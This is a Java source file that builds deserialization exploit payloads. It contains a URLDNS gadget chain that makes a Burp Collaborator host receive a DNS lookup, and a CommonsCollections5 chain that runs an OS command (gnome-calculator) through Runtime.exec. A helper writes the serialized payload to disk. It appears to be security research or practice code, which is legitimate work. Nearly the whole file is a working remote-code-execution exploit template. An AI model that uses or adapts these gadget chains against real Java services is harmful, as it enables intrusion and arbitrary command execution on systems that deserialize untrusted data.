package com.quangvo;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;

public class Main {


    public static void main(String[] args) {
        // write your code here
        try {
            CommonsCollections5();
        } catch (Exception e) {
            System.out.println("Exception triggered");
        }
        // Deserialize
//        try {
//            FileInputStream fileIn = new FileInputStream(fileName);
//            ObjectInputStream objIn = new ObjectInputStream(fileIn);
//            Object obj = objIn.readObject();
//            System.out.println("Deserialized: " + obj.toString());
//        } catch (IOException e) {
//            System.out.println("Deserialize IO ");
//        } catch (ClassNotFoundException e) {
//            System.out.println("class not found");
//        }

    }

    // URL DNS gadget chain
    public static void URLDNSChain()  throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        URL url = new URL("http://p4urvnku7az90bfajn1hx11t6kca0z.burpcollaborator.net");
        String fileName = "/home/quangvo1/IdeaProjects/payloadser";
        HashMap<URL, Integer> ht = new HashMap<URL, Integer>();
        ht.put(url, 123);
        Field f1 = URL.class.getDeclaredField("hashCode");
        f1.setAccessible(true);
        f1.set(url, -1);
        serializeObject(ht, fileName);
    }

    // Commons Collection gadget chain
    public static void CommonsCollections5() throws IllegalAccessException, NoSuchFieldException {

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"gnome-calculator"})});
        HashMap innerMap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innerMap,chain);
        TiedMapEntry tiedMap = new TiedMapEntry(map,123);
        tiedMap.toString();

        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);

        Field fi = poc.getClass().getDeclaredField("val");
        fi.setAccessible(true);
        fi.set(poc, tiedMap);
    }

    public static void serializeObject(Object obj, String fileName) {
        try {
            FileOutputStream fileOut = new FileOutputStream(fileName);
            ObjectOutputStream objOut = new ObjectOutputStream(fileOut);
            objOut.writeObject(obj);

            fileOut.close();
            objOut.close();
        } catch (IOException e) {
            System.out.println("IO Exception" + e.getMessage());
        }
    }

}
